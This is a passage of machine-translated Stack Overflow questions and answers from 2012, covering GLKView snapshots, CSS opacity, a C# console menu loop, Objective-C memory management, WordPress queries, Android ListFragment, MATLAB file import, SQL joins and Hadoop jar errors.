- (void)glkView:(GLKView *)view drawInRect:(CGRect)rect
{
    if ((self.view != view)) NSLog(@"drawing for snapshot");
    // draw code ...
} 
```

但没有运气。我正在考虑的另一种方法是创建一个布尔变量，该变量将在`-snapshot`被调用时`-glkView:drawInRect:`设置，并在绘制快照特定视图后将其重置。但这看起来很脏，并且可能会导致多个错误，尤其是在以 60 fps 绘制时。

您是否提供任何建议或示例来检测`-glkView:drawInRect:`该方法是否正在绘图`-snapshot`？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T06:07:03.920

子类`GLKView`化并覆盖该`snapshot`方法，如下所示：

```
- (UIImage *)snapshot
{
    self.isDrawingSnapshot = YES;

    UIImage *result = [super snapshot];

    self.isDrawingSnapshot = NO;
    return result;
} 
```

除了属性，您还可以使用自定义委托来通知您的视图控制器或发布`NSNotification`.

# css - 如何防止 CSS NOT 选择器更改子元素的父元素

> ID：13328943
> 
> 赞同：1
> 
> 时间：2012-11-11T05:53:39.770
> 
> 标签：css, css-selectors

我在 Jmpress.js 幻灯片框架中遇到了 CSS **NOT选择器的问题。**

它可以很好地使我的非活动幻灯片不透明。但这也会影响存储我的活动孩子的父幻灯片，因此即使我的孩子幻灯片处于活动状态，我最终也会显示为不透明。

我已经包含了正在发生的事情的视频。

[http://www.youtube.com/watch?v=2xvLMIQ2fSY](http://www.youtube.com/watch?v=2xvLMIQ2fSY)

适合层次结构的幻灯片应如何可见的示例

这是有道理的，但我想会有很多父/子关系。它就像一个菜单层次结构。

因此，如果我在子幻灯片上，那么我希望它的父级（它变得不透明从而影响其子级）不会受到影响，尽管任何其他幻灯片都设置为不透明。

*   一个
    *   A1
    *   A2
*   乙
    *   B1
    *   B2
*   C

如果有人正在查看**B2**，那么我希望**B**可见，但我希望**A**和**C**不透明。我在下面包含代码

戴夫

```
<html>
<head>
<style>
    /* Lots of CSS plus */
    .step:not(.active) {
        opacity: 0.3;
    }
</style>
</head>
<body>
    <div id="presentation">

        <!-- Any slide/step that is active shows while all others have an opacity of .3 -->  
        <div id="step_1" class="step" data--template="mytemplate" data-x="0" data-y="0" data-rotate="0" data-scale="0">
            <h2 class="StepTitle">My Slide</h2>
        </div>

        <div id="step_2" class="step" data--template="mytemplate" data-x="750" data-y="50" data-rotate="0" data-scale="0">
            <h2 class="StepTitle">My next Slide</h2>
        </div>

        <div id="step_3" class="step" data--template="mytemplate" data-x="1500" data-y="100" data-rotate="0" data-scale="0">
            <h2 class="StepTitle">David</h2>

            <!-- 
            When this slide: Step_4 becomes ACTIVE, its parent Step_3 becomes InACTIVE
            Because parent is inactive, Step 4 shows with an Opacity of 0.3, 
            when I really want the default Opacity of 1.0
            -->
            <div id="step_4" class="step" data--template="mytemplate" data-x="0" data-y="500" data-rotate="0" data-scale="0">
                <h2 class="StepTitle">You Tube</h2>
            </div>
        </div>

    </div>

    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
    <script src="js/jmpress.all.js" type="text/javascript"></script>
    <script type="text/javascript" charset="utf-8">
        $(function () {
            $('#presentation').jmpress();
        });
    </script>

</body>
</html> 
```

吹吹

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:02:47.020

您可以使用另一个 css 规则来匹配非活动父级中的活动 div，并将您的 1.0 不透明度应用于它，如下所示：

```
.step:not(.active) {
    opacity: 0.3;
}

.step:not(.active) div.active {
   opacity: 1.0;
} 
```

那应该做你想做的事。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T22:23:08.210

谢谢尼尔森的回复，您提供的选择器帮助解决了问题，但最终我的问题需要通过以下方式解决

[http://www.impressivewebs.com/css-opacity-that-doesnt-affect-child-elements/](http://www.impressivewebs.com/css-opacity-that-doesnt-affect-child-elements/)

CSS不透明度的问题

当我们将子元素添加到此代码影响的 html 元素时，就会出现问题。所有子元素都将继承相同的不透明度设置，即使您尝试为所有这些元素指定完全不透明度（无论如何都太麻烦了）。

我的代码现在有一个用于父面板的包装器对象，并且孩子们坐在该包装器面板之外但在幻灯片本身内部。

```
<slide id="step_3">
    <div class="panel">
        <a name="step3"></a>
        <h2 class="StepTitle">Multi Slides</h2>
    </div>

    <slide id="step_4">
        <div class="panel">
            <a name="step4"></a>
            <h2 class="StepTitle">You Tube</h2>
        </div>
    </slide>

    <slide id="step_5">
        <div class="panel">
            <a name="step5"></a>
            <h2 class="StepTitle">IFrame</h2>
        </div>
    </slide>
</slide> 
```

# c# - 用循环链接键？C＃

> ID：13328945
> 
> 赞同：0
> 
> 时间：2012-11-11T05:54:34.790
> 
> 标签：c#, console-application

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace GameEdition3
{
class Program
{
    static void Main(string[] args)
    {

        Data classData = new Data();

        Console.WriteLine("{0}", classData.TitleMenu());

        while (true) 
        {
            ConsoleKeyInfo PressKey;
            PressKey = Console.ReadKey();

            while (PressKey.Key == ConsoleKey.Backspace)
            {
                Console.Clear();
                Console.WriteLine("{0}", classData.TitleMenu());
                PressKey  = Console.ReadKey();
            }

            while (PressKey.Key == ConsoleKey.I)
            {
                Console.Clear();
                Console.WriteLine("{0}", classData.Information());
                PressKey =Console.ReadKey();
            }

            while (PressKey.Key == ConsoleKey.D1)
            {
                Console.Clear();
                Console.Write("Please type in the Item you want. Warhammer, Heavy Armor, Boots, or Sword: ");
                Console.WriteLine("{0}", classData.myFunction());
                Console.WriteLine("\nPress Backspace to go back to the menu and you can view your item in the Display all Items tab");
                PressKey = Console.ReadKey();
            }

            while (PressKey.Key == ConsoleKey.D2)
            {
                Console.Clear();
                Console.WriteLine("{0}", classData.result);
                PressKey = Console.ReadKey();

            }

            while (PressKey.Key == ConsoleKey.D3)
            {
                Console.Clear();
                PressKey = Console.ReadKey();

            }

            if (PressKey.Key == ConsoleKey.D4)
            {
                return;

            }

            Console.Read();
        }
    }

    }
} 
```

**/

你好。我制作了这个菜鸟游戏，您可以在其中按下一个键来获得不同的菜单和一组方向。问题是，一旦我按下一个键并转到那个特定的方法，我就无法返回。我希望 PressedKey 继续循环，这样我就可以按键进入程序的不同部分。我希望我解释得足够好。

示例：我按 I 键。 I 键进入一组方向。我需要按退格键才能进入主菜单。退格不起作用。如何使这些 ConsoleKeys 工作？

PS：我尝试了 while、if 语句、do while 和 while(true)。

如果有人想尝试一下，这是它附带的类： [http](http://pastebin.com/GivANrwC) : //pastebin.com/GivANrwC 将类命名为 Data.cs。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T06:44:00.413

一个问题是`Console.Read();`循环末尾的行。这告诉程序等待输入一行文本，然后按 Enter 键。键入的文本的第一个字母没有保存在任何地方并且*丢失了*。

删除那条线后，您仍然调用`Console.ReadKey()`太多。每次调用该方法时，它都会吃掉输入的键。因此，例如，如果您按“I”，则进入此部分：

```
 while (PressKey.Key == ConsoleKey.I)
    {
        Console.Clear();
        Console.WriteLine("{0}", classData.Information());
        PressKey =Console.ReadKey();
    } 
```

之后`WriteLine`，它会调用`ReadKey()`，如果不是`ConsoleKey.I`，则退出小循环，然后重新启动大循环。但是在更大的循环开始时，您`ReadKey()`再次调用，而不检查最后按下的键的值。

试试这个版本：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace GameEdition3
{
class Program
{
    static void Main(string[] args)
    {

        Data classData = new Data();

        Console.WriteLine("{0}", classData.TitleMenu());

        while (true) 
        {
            ConsoleKeyInfo PressKey;
            PressKey = Console.ReadKey();

            if (PressKey.Key == ConsoleKey.Backspace)
            {
                Console.Clear();
                Console.WriteLine("{0}", classData.TitleMenu());
            }
            else if (PressKey.Key == ConsoleKey.I)
            {
                Console.Clear();
                Console.WriteLine("{0}", classData.Information());
            }
            else if (PressKey.Key == ConsoleKey.D1)
            {
                Console.Clear();
                Console.Write("Please type in the Item you want. Warhammer, Heavy Armor, Boots, or Sword: ");
                Console.WriteLine("{0}", classData.myFunction());
                Console.WriteLine("\nPress Backspace to go back to the menu and you can view your item in the Display all Items tab");
            }
            else if (PressKey.Key == ConsoleKey.D2)
            {
                Console.Clear();
                Console.WriteLine("{0}", classData.result);
            }
            else if (PressKey.Key == ConsoleKey.D3)
            {
                Console.Clear();
            }
            else if (PressKey.Key == ConsoleKey.D4)
            {
                return;
            }
        }
    }

}
} 
```

`while`这也表明，当您检查按下了哪个键时，无需使用小循环。让所有的循环都由外循环完成。

# ios - 视图控制器的 NSMutableArray 未释放其对象的内存

> ID：13328949
> 
> 赞同：2
> 
> 时间：2012-11-11T05:56:14.647
> 
> 标签：ios, memory-management, nsmutablearray, viewcontroller

这基本上与我的其他问题[有关](https://stackoverflow.com/questions/13118926/releasing-memory-of-multiple-view-controllers-inside-a-scrollview)

我正在尝试发布`NSMutableArray`包含 viewControllers 的内容。我愿意：

```
self.viewControllers = nil; 
```

因为`viewWillDisappear`我要转移到另一个视图。但无论我做什么，视图控制器都不会被释放。我也试过：

```
[[scrollView subviews] makeObjectsPerformSelector:@selector(removeFromSuperview)]; 
```

其中 scrollview 是拥有包含`NSMutableArray`.

尽管包含的引用计数`NSMutableArray`为 0，但我看到实时视图控制器（在仪器中）的计数没有改变。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T07:14:38.530

几点观察：

1.  确保通过静态分析器运行非 ARC 代码。这可以找到许多困扰非 ARC 代码的内存管理问题。从 Xcode 的“产品”菜单中选择“分析”，或按`command`+ `shift`+ `B`。如果您使用 ARC，很多这些内存管理问题都会消失，但如果您不使用 ARC，静态分析器在检查您的代码时可能非常有用。

2.  您的尝试`removeFromSuperview`是不必要的，并且不会影响`retainCount`视图控制器本身。但是，我是否从这次尝试中推断出您已经创建了视图控制器，然后将它们的视图添加到了滚动视图中？`addChildViewController`如果是这样，您是否为每一项都做了必要的工作？但是，如果是这样，您确实需要为其中`removeFromParentViewController`的每一个进行关联。

3.  视图控制器的正确释放取决于您如何定义和分配`viewControllers`数组以及如何填充它。

    但是，例如，我有一个属性：

    ```
    @property (nonatomic, retain) NSMutableArray *array; 
    ```

    我用下面的代码初始化了它（注意`autorelease`它`NSMutableArray`本身（因为我使用了为我保留它的访问器方法），以及对象的显式`release`）`Object`：

    ```
    - (void)makeArray
    {
        // create an array, using the accessor method (thus why I'm using an autorelease object)

        self.array = [[[NSMutableArray alloc] init] autorelease];

        // just add four random objects to the array.
        // note, adding them to the array increases their retain count, thus I 
        // release them to bring the retain count back to +1 ... I could have 
        // done that via autorelease, too

        for (NSInteger i = 1; i < 4; i++)
        {
            Object *obj = [[Object alloc] initWithString:[NSString stringWithFormat:@"Test %d", i]];
            [self.array addObject:obj];
            [obj release];
        }
    } 
    ```

    如果我检查这些`retainCount`值，我可以看到一切都有一个`retainCount`+1，这是适当的：

    ```
    - (void)logArray
    {
        // let's examine the retain counts for the objects in the array
        // should be "1" given there are no other strong references anywhere

        for (id obj in self.array)
            NSLog(@"%s %@ (retainCount = %d)", __FUNCTION__, obj, [obj retainCount]);

        // let's also examine the retain count for the array, itself
        // this should also be "1"

        NSLog(@"%s retainCount = %d", __FUNCTION__, [self.array retainCount]);
    } 
    ```

    当我在以下方法中清除它时，它（以及数组的各个对象）被正确释放（这一事实通过`Object`类`NSLog`在其`dealloc`方法期间执行 a 的事实得到验证）：

    ```
    - (void)clearArray
    {
        // let's use the accessor method to release the array and make sure
        // the pointer is nil

        self.array = nil;
    } 
    ```

4.  这是一种冗长的说法，即您的语法`self.viewControllers = nil;`是释放数组（及其成员对象）的完美方式，假设数组被定义为`retain`如前一点所示的属性。但是，如果数组的成员对象没有被释放，那么这些对象显然不会`retainCount`降为零。我会尝试，就在您之前`self.viewControllers = nil;`，不仅记录`retainCount`数组本身的 ，还记录数组`retainCount`中各个对象的 ，以确认它们的`retainCount`设置。

    那时它们都应该有一个`retainCount`+1（否则还有其他东西保留它们，或者因为它们被过度保留，你在那些视图控制器中有一些保留周期（又名强引用周期），或者其他东西是合法地保留它们（例如，在某些时候您将其中一个视图控制器推送到导航器堆栈中，但您还没有将它们弹出））。

5.  如果您仍然泄漏，我会使用 Instruments 来[查找泄漏](https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/InstrumentsUserGuide/MemoryManagementforYouriOSApp/MemoryManagementforYouriOSApp.html#//apple_ref/doc/uid/TP40004652-CH11-SW4)。顺便说一句，当检查调用树是否有泄漏时，我发现“反转调用树”和“隐藏系统库”很有用。

* * *

**更新：**

在上面的第 4 点中，我警告了保留周期的风险。保留周期的一个示例是视图控制器使用 a以及在释放视图控制器时`NSTimer`失败`invalidate`和计时器。`release`与您离线聊天，这听起来可能是问题所在，您试图在其中进行`release`，但永远不会调用，因为计时器本身正在保留视图控制器。在释放. _ _ （例如，可能有一个停止计时器的协议，让您的子视图控制器符合该协议。）`NSTimer``dealloc``dealloc``invalidate``release``NSTimer``NSMutableArray`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T06:51:19.933

鉴于提供的详细信息，我们将很难诊断。但是，您可以通过运行 Instruments（例如 Leaks）自行快速诊断。如果进行了相应配置，它可以：

*   指出保留周期
*   记录所有引用计数操作
*   和/或您可以使用 heapshot 分析

一旦掌握了这些工具的窍门，隔离这些问题所需的时间（通常）应该减少到几分钟。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T10:10:26.830

你可以做一个快速测试：

```
- (void) test
{
    NSMutableArray *testArray = [NSMutableArray arrayWithCapacity:0];
    // MyViewController is your view controller class
    MyViewController *vc = [[MyViewController alloc] initWithNibName:@"MyViewController" bundle:nil]; // add autorelease if you aren't using ARC
    [testArray addObject:vc];

    // On exit, testArray will be released, so will vc
} 
```

在 MyViewController 中的 dealloc 上设置断点并检查它是否被调用。如果它被调用，而不是在你的代码中，这意味着你的视图控制器被保留在某个地方，你必须找到它们被保留在哪里。

# api - 使用 REST API 在 Openshift 上创建应用程序

> ID：13328955
> 
> 赞同：1
> 
> 时间：2012-11-11T05:57:26.797
> 
> 标签：api, rest, openshift

我正在尝试使用 REST API (v1.2) 在 OpenShift 上创建一个应用程序。

当我一次创建一个应用程序时，事情可以正常工作，但是，当我同时（并行）执行多个创建调用时，我得到一个错误。

这是一个 500 状态码。返回给我的数据是——

```
error: "{"messages":[{
          "exit_code":1,
          "field":null,
          "severity":"error",
          "text":"Unable to create gear on node"
         }],
         "version":"1.2",
         "supported_api_versions":[1.0,1.1,1.2],
         "status":"internal_server_error",
         "data":null,
         "type":null
        }" 
```

我查看了 API 文档，找不到问题所在。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T17:58:55.733

这是当今 OpenShift 的一个已知限制。并且不建议在给定的应用程序上执行并行操作（如放大缩小等）或同时创建/删除多个应用程序。

# custom-post-type - 在此 Wordpress 循环中包含自定义帖子类型

> ID：13328967
> 
> 赞同：0
> 
> 时间：2012-11-11T06:00:05.143
> 
> 标签：custom-post-type, wordpress

我有 2 种帖子类型，一种是游戏，另一种是我试图包含在此循环中的电影，我得到了帮助，所以我不确定要更改什么：

```
<?php if ( have_posts() ) : ?>

    <?php /* Start the Loop */ ?>

    <?php
    $query = new WP_Query( array( 'tag__not_in' => array( 20 ) ) );/* Exclude Tag 20 (reviews)*/
    while( $query->have_posts() ):
    $query->the_post();

    get_template_part( 'content', get_post_format() );

    endwhile;

    ?>

<?php else : ?>

    <?php get_template_part( 'no-results', 'index' ); ?>

<?php endif; ?> 
```

我会在哪里包含这些帖子类型？

* * *

**编辑：我更新了循环，但页面只是空白/白色。这是我所拥有的：**

```
<?php if ( have_posts() ) : ?>

<?php /* Start the Loop */ ?>

<?php
$query = new WP_Query( array( 'post_type' => array( 'movies_cp','gaming_cp'), 'tag__not_in' => array( 20 )) )
while( $query->have_posts() ):
$query->the_post();

get_template_part( 'content', get_post_format() );

endwhile;

?>

<?php else : ?>

<?php get_template_part( 'no-results', 'index' ); ?>

<?php endif; ?> 
```

电影自定义帖子类型（使用自定义帖子类型 UI 插件）：

```
register_post_type('movies_cp', array(  'label' => 'Movie Posts','description' => '','public' => true,'show_ui' => true,'show_in_menu' => true,'capability_type' => 'post','hierarchical' => false,'rewrite' => array('slug' => 'movies'),'query_var' => true,'exclude_from_search' => false,'supports' => array('title','editor','excerpt','trackbacks','custom-fields','comments','revisions','thumbnail','author','page-attributes',),'taxonomies' => array('category','post_tag',),'labels' => array (
  'name' => 'Movie Posts',
  'singular_name' => 'Movie Post',
  'menu_name' => 'Movie Posts',
  'add_new' => 'Add Movie Post',
  'add_new_item' => 'Add New Movie Post',
  'edit' => 'Edit',
  'edit_item' => 'Edit Movie Post',
  'new_item' => 'New Movie Post',
  'view' => 'View Movie Post',
  'view_item' => 'View Movie Post',
  'search_items' => 'Search Movie Posts',
  'not_found' => 'No Movie Posts Found',
  'not_found_in_trash' => 'No Movie Posts Found in Trash',
  'parent' => 'Parent Movie Post',
),) ); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T11:20:21.340

您想获取多于一种帖子类型的帖子吗？如果是，下面是可以帮助您的代码。

```
$query = new WP_Query( array( 'post_type' => array( 'gaming','movie'), 'tag__not_in' => array( 20 )) ) 
```

[http://codex.wordpress.org/Class_Reference/WP_Query](http://codex.wordpress.org/Class_Reference/WP_Query)

# android - 在 listfragment 中使用 getview 时应用程序崩溃

> ID：13328971
> 
> 赞同：0
> 
> 时间：2012-11-11T06:01:54.980
> 
> 标签：android

我正在学习如何使用 ListFragment 并且应用程序在运行以下代码时崩溃：

```
public class profileListFragment extends ListFragment {

String[] countries = new String[] {"USA", "China"};

@Override
public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {

    getListView().setChoiceMode(ListView.CHOICE_MODE_SINGLE);
    ArrayAdapter<String> adapter = new ArrayAdapter<String>(inflater.getContext(),
            android.R.layout.simple_list_item_1,countries);
    setListAdapter(adapter);
    View retView = super.onCreateView(inflater, container,  savedInstanceState);

    return retView;//super.onCreateView(inflater, container,  savedInstanceState);
}

public void onListItemClick(ListView I, View v, int position, long id){
    I.setChoiceMode(ListView.CHOICE_MODE_SINGLE);
    I.setSelector(android.R.color.holo_blue_light);
}
} 
```

我知道这是因为 getListView() 语句，因为当我删除它时它不会崩溃......

非常感谢任何帮助

```
I/ActivityManager(352): START {cmp=myapp.app/.loadProfile u=0} from pid 24295

E/AndroidRuntime(24295): java.lang.RuntimeException: Unable to start activity ComponentInfo{myapp.app/myapp.app.loadProfile}: android.view.InflateException: Binary XML file line #6: Error inflating class fragment

E/AndroidRuntime(24295): at myapp.app.loadProfile.onCreate(loadProfile.java:12)

E/AndroidRuntime(24295): at myapp.app.profileListFragment.onCreateView(profileListFragment.java:19)

11-10 22:15:01.002: W/ActivityManager(352):   Force finishing activity myapp.app/.loadProfile 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T16:59:19.307

我做了一个看起来像这样的xml：

```
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:orientation="vertical"
     android:layout_width="match_parent"
     android:layout_height="match_parent" >

<ListView
    android:id="@id/android:list"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:choiceMode="singleChoice" >

</ListView>

</LinearLayout> 
```

然后对其进行充气并在该视图上执行 findViewById 以查找 android.R.id.list ，然后首先使用我需要的 ListView 处理程序。代码片段是这样的：

```
 View retView = inflater.inflate(R.layout.fragment_load_profile_list_layout,container, false);
    ListView lv = (ListView) retView.findViewById(android.R.id.list);
    lv.setSelector(android.R.color.holo_blue_light);
    lv.setChoiceMode(ListView.CHOICE_MODE_SINGLE); 
```

# consistent-hashing - 有没有相同的一致性哈希功能的算法？

> ID：13328972
> 
> 赞同：2
> 
> 时间：2012-11-11T06:02:01.547
> 
> 标签：consistent-hashing

我们的项目需要一个分布式可扩展的 no-sql 数据库。为了安全起见，每个数据记录都必须存储在多个数据服务器（一个主服务器和一些从服务器）中。

我们希望系统能够动态地增加或减少服务器而不丢失任何数据记录。有没有相同的一致性哈希功能的算法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T06:36:35.080

如果我是你，我会使用[`sha1`](http://en.wikipedia.org/wiki/Sha1)散列算法作为你数据的关键。到目前为止，没有人能够找到此哈希的冲突。

sha1 对 Python 或 Perl 等常用脚本语言有很好的支持，因此您不必重新发明轮子。

作为一个小数据点，很多软件都使用 sha1 作为哈希算法的选择（例如 git）。

# javascript - 将 HTML 5 camvas 图像保存到服务器

> ID：13328973
> 
> 赞同：-2
> 
> 时间：2012-11-11T06:02:02.843
> 
> 标签：javascript, html

我需要将带有 id='area' 的画布数据作为图像保存到我的服务器中的文件夹 / 使用 javascript 上传。

我试图在浏览器中显示图像 window.open(canvas.toDataURL("image/png")); 但浏览器显示空白屏幕

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:05:31.453

你可以使用`toDataURL()`

**注意**： toDataURL() 方法要求绘制到画布上的任何图像都托管在与执行它的代码具有相同域的 Web 服务器上。如果不满足此条件，则会引发 SECURITY_ERR 异常。

例如

```
 <body>
    <canvas id="myCanvas" width="578" height="200" style="display:none;"></canvas>
    <img id="canvasImg" style="border:1px solid #9C9898;" alt="Right click to save me!">
    <script>
      var canvas = document.getElementById('myCanvas');
      var context = canvas.getContext('2d');

      // draw cloud
      context.beginPath();
      context.moveTo(170, 80);
      context.bezierCurveTo(130, 100, 130, 150, 230, 150);
      context.bezierCurveTo(250, 180, 320, 180, 340, 150);
      context.bezierCurveTo(420, 150, 420, 120, 390, 100);
      context.bezierCurveTo(430, 40, 370, 30, 340, 50);
      context.bezierCurveTo(320, 5, 250, 20, 250, 50);
      context.bezierCurveTo(200, 5, 150, 20, 170, 80);
      context.closePath();
      context.lineWidth = 5;
      context.fillStyle = '#8ED6FF';
      context.fill();
      context.strokeStyle = '#0000ff';
      context.stroke();

      // save canvas image as data url (png format by default)
      var dataURL = canvas.toDataURL();

      // set canvasImg image src to dataURL
      // so it can be saved as an image
      document.getElementById('canvasImg').src = dataURL;

    </script>
  </body> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T14:21:04.173

我实际上在我早期的项目中解决了这个问题。

并且关于用户/服务器之间的安全性，这种方法绕过了它，因为我在这里遇到了另一个答案中提到的可能问题。

这可能是一种笨拙的方法，但至少它可以工作，并且不允许我根据一些合法的事情发布代码 ma bob。

**在客户端：**

您可以做的是让用户单击一个按钮以激活异步回发，然后在运行回发之前将您的画布内容转换为您选择的格式的图像，然后将其转换为 base64 字符串并将其放置到隐藏文本框并将文本框的内容发送到您的服务器，就像您发送常规注册表单一样。

**在服务器上：**

将您新获取的 base64 字符串转换回与您在客户端创建的格式相同的图片，然后保存。

# matlab - 在 MATLAB 中导入多个文件

> ID：13328974
> 
> 赞同：2
> 
> 时间：2012-11-11T06:02:07.820
> 
> 标签：matlab

对于我正在撰写的实验室报告，我需要分析大约 90 个数据集。不幸的是，它们都是文本文件，名称为“small single crystal si iv curve part 1 106w_m^2”，没有文件扩展名。我把它们都放在一个文件夹里。我想用它的原始名称将每个变量输入到它自己的变量中，以便以后进行操作。这需要用下划线替换文件名中的空格并删除克拉。我想制作一个 .m 文件来为我做这件事。到目前为止，我有这个：

```
function [t]=makedata()
%makes data 
x=dir;
i=0;
for l=3:length(x)
    i=i+1;
    y=x(l).name;
    t=y(1:end-5);
    t=regexprep(t,' ','_');
    t=importdata(y);
end
end 
```

显然这段代码不起作用。我知道我的 MATLAB 技能很弱，因此将不胜感激。到目前为止，我的代码使用 dir 命令收集目录中所有内容的数据，然后遍历该数据，将名称更改为可以输出的名称，然后导入数据。

我怎样才能使这项工作？我不知道如何使它输出具有不同名称的变量。我使用 eval 命令进行了研究，但不知道如何成功实现它，加上[常见问题解答](http://matlab.wikia.com/wiki/FAQ#How_can_I_create_variables_A1.2C_A2.2C....2CA10_in_a_loop.3F)说要避免这种方法。

感谢您的任何帮助。我还没有在网上找到解决这个问题的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:18:22.997

为什么不简单地获取文件列表并从 ONE 列表中处理它们？为什么你必须经历为每个文件创建一个变量名的所有这些混乱？

使用`dir()`你可以获得一个很好的结构数组。每个结构都有文件的信息。

```
 list_of_files=dir([fullfile(pwd) '\\*.txt']);
 list_of_files(1).name
 list_of_files(2).name
 etc... 
```

如果文件没有扩展名，并且正如您所说，它们都在同一个目录中，那么只需编写

```
 list_of_files=dir(fullfile(pwd)); 
```

我在`pwd`上面用于目录的地方。在您的情况下使用正确的目录名称，它可以是文件系统上的任何位置。

现在，您可以使用调用的这个 ONE 变量`list_of_files`来使用其名称打开每个文件并读取文件中的数据并对文件进行任何其他处理。

您为每个文件名创建一个变量的方法是解决这个简单问题的错误方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T06:23:48.220

摆脱那些不受支持的字符的一种方法是[`genvarname`](http://www.mathworks.nl/help/matlab/ref/genvarname.html)函数。就个人而言，我会为您的目的创建一个包含所有相关信息的结构。您可以将这样的结构放入数组中，然后处理数组的每个元素。

这样，您实际上不必从文件名中找出变量名称，并且处理起来要容易得多（否则，您需要为下一步处理的变量名称列表，或者为每个单独的变量复制代码/data 集，这很容易出错）。

所以我会编写一个函数`function data = importSingleDataFile(filename)`来读取文件并返回一个类似`data = struct('filename', filename, 'data', yourLoadedData)`. 然后在另一个函数中，您可以遍历所有文件并将这些结构连接到一个数组中。

# database - 与其他表的表关系，如果其他表相关，我应该只加入一个吗

> ID：13328979
> 
> 赞同：0
> 
> 时间：2012-11-11T06:02:54.603
> 
> 标签：database, normalization

我有4张桌子，即：

```
tbl_users
tbl_college
tbl_courses
tbl_sections 
```

`tbl_users`当然包含`username`，，`password`

如果我想获取有关某个用户的所有信息，包括：

1.  他/她属于哪个学院（例如**工程**学院或**工商管理学院**）

2.  他/她正在修读什么课程（例如**土木工程**理学士或**市场营销理学士**）

3.  他/她在哪个部门（例如**CBC**或**ITED**）

如果`tbl_courses`是这样设置的：

```
tbl_courses (id, course_name, college_id) 
```

其中`college_id`指的是`tbl_college.id`

并且 tbl_sections 设置如下：

```
tbl_sections(id, section_name, course_id) 
```

其中`course_id`指的是`tbl_course.id`

**我应该怎么做才能选择与用户**相关的所有信息，在这种情况下，这些用户是具有`username`, `password`, `college`, `course`,的学生`section`

我想到的是我可以创建另一个表，即：`tbl_user_section`，像这样：

```
 CREATE TABLE tbl_user_section (user_id INTEGER NOT NULL, section_id INTEGER NOT NULL,
 FOREIGN KEY user_id REFERENCES users(id),
 FOREIGN KEY section_id REFERENCES sections(id)) 
```

这样我就可以有一张桌子，其中包含谁在哪个部分。另外，在我看来，通过这种方式，我可以轻松地进行连接以获取相关信息：

```
SELECT tbl_users.username, tbl_sections.section_name FROM tbl_users 
INNER JOIN tbl_user_section ON tbl_users.id = tbl_user_section.user_id 
INNER JOIN tbl_sections ON tbl_sections.id = tbl_user_section.section_id 
```

我最近在这种设置中遇到的问题是，如果用户还没有在某个部分中，当我尝试使用上面的代码查询所有用户时，将不会选择该用户，否则不会显示。

同样通过这种设置，我可能可以做到这一点

```
SELECT tbl_users.username, tbl_sections.section_name,
tbl_courses.course_name, tbl_colleges.college_name FROM tbl_users 
INNER JOIN tbl_user_section ON tbl_users.id = tbl_user_section.user_id 
INNER JOIN tbl_sections ON tbl_sections.id = tbl_user_section.section_id
INNER JOIN tbl_courses ON tbl_courses.id = tbl_sections.course_id
INNER JOIN tbl_colleges ON tbl_college.id = tbl_courses.college_id 
```

获取查询中包含的那些信​​息。

在您看来，您可以从我创建的设置中看到哪些其他问题？

`section_id`只在 `tbl_users 中使用该字段而不是像我一样创建一个单独的表是否更明智？

如果我有用户类型怎么办，我应该做同样的事情（为用户类型分开一个表）并且有一个`tbl_user_type`或只是让它们在同一个表中`tbl_users`

假设这是一个大项目，你会选择什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T06:06:00.560

如果由于一个或多个表中缺少用户而无法显示用户，则可以使用 an`OUTER JOIN`让它们显示，在来自这些表的列中使用 NULL 值。因此，没有部分的学生的 section_name 的值为 NULL，但所有其他信息仍然完好无损。

# hadoop - hadoop-word count - 导出的 jar 没有运行

> ID：13328980
> 
> 赞同：0
> 
> 时间：2012-11-11T06:02:56.193
> 
> 标签：hadoop, word-count, classnotfound

我对 Hadoop 很陌生。我设置了单节点集群 hadoop-1.0.4，我还从 apache hadoop web 下载了示例的 jar - hadoop-exaples-1.0.4.jar。使用 jar 和命令“hadoop jar hadoop-examples-1.0.4.jar wordcount 'input-dir' 'output-dir'”我能够运行简单的 wordcount 问题。

问题 :: 现在我将在 apache hadoop 网站中发现的 wordcount 问题的代码复制到 eclipse 中并导出一个现在只包含 WordCount 类的 jar 文件，我将 jar 重命名为 wc.jar 但现在使用相同的命令“ hadoop jar wc.jar wordcount 'input-dir' 'output-dir' " ...它给出了错误 :: "Exception in thread "main" java.lang.ClassNotFoundException: WordCount " .... 我重新检查了代码并确保类名是 WordCount ......但它仍然给出同样的错误......我完全不知道该怎么办？希望你能帮忙。这是我用来制作 jar 的代码链接.... [http://wiki.apache.org/hadoop/WordCount](http://wiki.apache.org/hadoop/WordCount)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T08:01:08.040

尝试使用包路径：

```
hadoop jar wc.jar org.myorg.WordCount 'input-dir' 'output-dir' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T00:20:00.593

我加 ：

```
 job.setjarByClass(org.myorg.WordCount.class); 
```

并按照 Erik 所说的命令运行：

```
 hadoop jar wc.jar org.myorg.WordCount 'input-dir' 'output-dir' 
```

有效 ！！

# sql - 在 Access 2003 和 SQL Server 2000 中替换输入行

> ID：13328984
